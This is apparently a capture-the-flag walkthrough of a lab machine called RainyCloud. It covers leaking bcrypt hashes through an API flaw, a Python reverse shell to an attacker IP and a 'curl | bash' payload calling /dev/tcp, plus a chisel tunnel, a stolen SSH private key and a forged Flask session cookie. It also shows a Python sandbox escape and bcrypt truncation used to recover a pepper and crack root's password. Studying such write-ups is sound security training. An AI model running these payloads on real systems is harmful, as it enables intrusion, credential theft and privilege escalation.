# RainyCloud

---

## Enumeration & Foothold

- nmap TCP Scan:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48dde361dc5d5878f881dd6172fe6581 (ECDSA)
|_  256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Found `dev.` subdomain but uses some IP filters, probably gonna be used when i get foothold or an SSRF vulnerability
- User `jack` may exist on the machine, got it form `/api/list`
- On logging in, and checking the page source I found:

```html
<!-- RainyCloud-4: TODO - Remove debug errors from prod -->
<h4> Error - Login Incorrect! <!-- /var/www/rainycloud/./app.py:288 --></h4>
```

- I left this error thing I went back to play with the `/api` path, and I was able to dump some hashes from `/api/user/1.0`, with a float type number, ints get filtered out. So i got all the hashes and tried to crack them.
- Spent quite a while to crack these bcrypt hashes but finally could crack gary's password:

```
rubberducky      (gary)
```

- Now I can login into the webapp, and I can start a docker container image.

```
Container Name	Port	Status	Image					Actions
gary			40001	Running	alpine-python:latest	    
```

- There's an option to execute commands so I used it to get a reverse shell using the following command:

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.2",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

- Got it with a `nc` listerner and upgraded it to a pty shell

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.184] 43016
/ $ ^[[6;5Rpython3 -c "import pty;pty.spawn('sh')"
python3 -c "import pty;pty.spawn('sh')"
/ $ ^[[8;5R^Z
zsh: suspended  nc -lvnp 9002
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9002
                               stty rows 39 cols 157
/ $ export TERM=xterm-256color
/ $ 

```

- I'm in a small container with very limited feature, but Im guessing if I tunnel the connection through a SOCKS5 proxy using `chisel` for example, I can get to `dev.` subdomain?
- Got another revshell connection to do other tasks if needed
- I can now access `dev.rainycloud.htb`, looks like the same website, maybe dev mode means more error output?

```bash
proxychains curl http://dev.rainycloud.htb

...

<h1 class="display-3">Welcome to RainyCloud (Dev)!</h1>

...

```

- For a proxy tunnel:

1. On my kali machine:

```bash
chisel server -p 8000 -reverse
```

2. On the target:

```bash
./chisel client 10.10.16.2:8000 R:socks
```

- Scanning and enumerating and running linpeas didn't yield any useful information
- Ran `deepce.sh` and I found some interesting information:

```bash
[+] Interesting environment variables ... No
HOME=/
HOME=/home/jack
HOSTNAME=e84e8d5ecb27                     
INVOCATION_ID=36afb8e8519c4db184eef42f14d9a70f                                                    
JOURNAL_STREAM=8:31431
LANG=en_GB.UTF-8              
LOGNAME=jack                    
OLDPWD=/tmp                        
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                        
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                     
PWD=/
PWD=/home/jack                               
PWD=/tmp/test                      
SHELL=/bin/bash                       
SHLVL=0                     
SHLVL=1                             
SHLVL=2                             
SHLVL=3                             
SYSTEMD_EXEC_PID=1193                             
TERM=xterm-256color               
USER=jack                 
_=/usr/bin/sleep
```

- The `SYSTEMD_EXEC_PID=1193` and `HOME=/home/jack` showed that jack's home directory might be mounted on this process, and it does!

```bash
/tmp/test $ cat /proc/1193/cwd/.ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA7Ce/LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq
qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow
SjS+Ew+ws4cpAdl/BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO
JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN/neeRPan3ue3iExiLdk7OA/8PkEVF0
/pLldRcUB09RUIoMPm8CR7ES/58p9MMHIHYWztcMtjz7mAfTcbwczq5YX3eNbHo9YFpo95
MqTueSxiSKsOQjPIpWPJ9LVHFyCEOW5ONR/NeWjxCEsaIz2NzFtPq5tcaLZbdhKnyaHE6k
m2eS8i8uVlMbY/XnUpRR1PKvWZwiqlzb4F89AkqnFooztdubdFbozV0vM7UhqKxtmMAtnu
a20uKD7bZV8W/rWvl5UpZ2A+0UEGicsAecT4kUghAAAFiHftftN37X7TAAAAB3NzaC1yc2
EAAAGBAOwnvywL62D/OKwGu0FOdWPh8VkQuapplV+MMIgrkJQ6s+97r0ZF6qnQ2w7UwpyV
---
```

- This is jack's RSA private key, used it to login via SSH and got user.txt
- Another path which also came in my mind during this process, whenever I ran `whoami` or `id`, my uid was `1000` but I wasnt in `/etc/passwd` file, so another way to find this secret path is to find somewhere where my user is recognized!

---

## Privilege Escalation (Jack -> Jack_adm)

- `jack_adm` can run `safe_python` as sudo with no password, so I'll have to pivot from jack to jack_adm

```bash
jack@rainyday:~$ sudo -l
Matching Defaults entries for jack on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on localhost:
    (jack_adm) NOPASSWD: /usr/bin/safe_python *

```

- Found secret key for Flask session in `secrets.py`

```python
SECRET_KEY = "f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67"
```

- Using the secret to decode the current session:

```bash
flask-unsign -c $(cat cookie) --secret $(cat secret) -d

{'username': 'gary'}
```

- Now I can make a session cookie for the username jack:

```bash
flask-unsign -s -c "{'username': 'jack'}" --secret $(cat secret)
eyJ1c2VybmFtZSI6ImphY2sifQ.Y6rNRw.bXeCKW9ptc3EhL2rIw3zP2tkPgY
```

- Using this cookie on the website I'm now `Jack` and I have access to the docker container image, got a revshell same way I did with the previous image as `gary`
- I didn't get anything useful from this image, so back to `(jack_adm) NOPASSWD: /usr/bin/safe_python *`
- I tried a simple python script to execute system commands:

```bash
jack@rainyday:/tmp/bitchass$ cat test.py 
import os

os.system("whoami")

print("Hello world!")
jack@rainyday:/tmp/bitchass$ python3 test.py
jack
Hello world!
jack@rainyday:/tmp/bitchass$ sudo -u jack_adm safe_python test.py
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
ImportError: __import__ not found
```

- The module `import` was not found it said, there should be somewhere else I can pull `import` from, because this is most likely sandboxed
- The way I did it, I pulled `__import__` using subclasses and builtins, more information can be found on this [Hacktricks article](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes), I did it via `<class 'warnings.catch_warnings'>` builtins' class, pulled `__import__` out of it and imported `os` then executed my commands

```bash
jack@rainyday:/tmp/bitchass$ cat poc.py 
().__class__.__bases__[0].__subclasses__()[144]()._module.__builtins__['__import__']('os').system('whoami')
jack@rainyday:/tmp/bitchass$ sudo -u jack_adm safe_python poc.py 
jack_adm
jack@rainyday:/tmp/bitchass$ 
```

- Now I got a reverse shell as `jack_adm`, prepared `shell.sh` revshell script, a simple `bash -i >& /dev/tcp/10.10.16.2/1337 0>&1`, and on the target machine I executed `curl 10.10.16.2/shell.sh | bash` as the payload

---

## Privilege Escalation (Jack_adm -> root)

- Again, no need for any sort of complicated enum

```bash
jack_adm@rainyday:~$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py
```

- A script that generates password hashes:

```bash
jack_adm@rainyday:/opt$ sudo -u root /opt/hash_system/hash_password.py
Enter Password> 
[+] Invalid Input Length! Must be <= 30 and >0
Enter Password> 10
[+] Hash: $2b$05$tw2vSrpM5VNADjuF0lCPQOXfE9IpnyZPhLVH2Rc.PcDJ3fs68Wc42
jack_adm@rainyday:/opt$ sudo -u root /opt/hash_system/hash_password.py
Enter Password> test
[+] Hash: $2b$05$YmRRhBs21e3ikk4gIoj3JOBRlt1mtraJQkl99dBHl/mwdxiYVYvw.
jack_adm@rainyday:/opt$ sudo -u root /opt/hash_system/hash_password.py
Enter Password> bash
[+] Hash: $2b$05$F/LmcmTAACcg3Yr9TJdJ7eA.NacqRuFJax1Qv600PODdkOqQa8qjO
jack_adm@rainyday:/opt$ 
```

- In my mind, I have plaintext + hash, maybe somehow I can get the used salt and crack another password? I still have some uncracked passwords that were previously gathered from the web app
- The only attack that I can think of is brute forcing the salt, I read from [the original site](https://www.usenix.org/legacy/events/usenix99/provos/provos_html/node4.html) that there's a maximum length for the key - the password - that is up to 56 bytes, 55 bytes excluding a terminating zery-byte

> the key argument is a secret encryption key, which can be a user-chosen password of up to 56 bytes (including a terminating zero byte when the key is an ASCII string).

- Since that the maximum password length for this script is 30 characters long, I'll have to use characters that are more than 1 byte, (UTF-8 or UTF-32) characters can be 4 bytes, for example accented characters like "". It's similar to a buffer overflow in the sense of the attack, my wild guess is that the password is in the form of `password-salt`, so I'll have to fill the first bytes and leave the rest for bruteforcing
- Found [this article](https://security.stackexchange.com/questions/39849/does-bcrypt-have-a-maximum-password-length) explaining further the process of overflowing the bcrypt algorithm, came to a conclusion that the password will be 72 bytes long, so in the first iteration I'll fill in 71 bytes, the next 70 bytes...etc. and bruteforce my way up to get the salt
- Here's some characters that are greater than 1 byte:

1. any US-ASCII letter -> 1 byte
2. `£` -----------------> 2 bytes
3. `€` -----------------> 3 bytes
4. `𐍈` -----------------> 4 bytes

```bash
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ echo -n 'a' > tmp            
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ ls -la tmp                
-rw-r--r-- 1 kali kali 1 Dec 27 07:43 tmp
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ echo -n '€' > tmp
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ ls -la tmp
-rw-r--r-- 1 kali kali 3 Dec 27 07:44 tmp
                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ 

```

- I'll only demonstrate the first iteration and do the rest, the first payload will be `17 * 𐍈` which is 68 bytes, I'll then add `aaaa` to be 72 bytes in total, for the first iteration, I'll only add `aaa`, the last letter will be the beginning character of the salt, can be bruteforced using john the ripper or hashcat, next iteration, the payload will end in `aa$` wher `$` is the previously cracked letter and so on... 
- First payload:

```zsh
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ cat tmp   
𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈aaa                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ ls -la tmp
-rw-r--r-- 1 kali kali 71 Dec 27 08:29 tmp
```

- First letter: `H`

```bash
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ john hash --wordlist=./wordlist.txt             
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈𐍈aaaH (?)
```

- At this point I couldn't bother automating this process so I just did it all manually to get it over with, maybe I'll automate it in the future. The final resulting salt is: `H34vyR41n`
- Now since I have the salt, I can edit `rockyou.txt` wordlist and append `H34vyR41n` to the end of each word, and attempt to crack the other passwords I couldn't crack before
- To make the new list: `sed 's/$/H34vyR41n/' rockyou.txt > rockyou_v2.txt`. Now let john do his magic
- Cracked root hash!

```zsh
┌──(kali㉿kali)-[~/…/HTB-CTF/Machines/RainyDay/to_root]
└─$ john hashes --wordlist=./rockyou_v2.txt                 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Remaining 2 password hashes with 2 different salts
Loaded hashes with cost 1 (iteration count) varying from 32 to 1024
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
246813579H34vyR41n (root)
```

- Used this password to root and worked:

```bash
jack_adm@rainyday:/opt$ su root
Password: 
root@rainyday:/opt# 
```

---
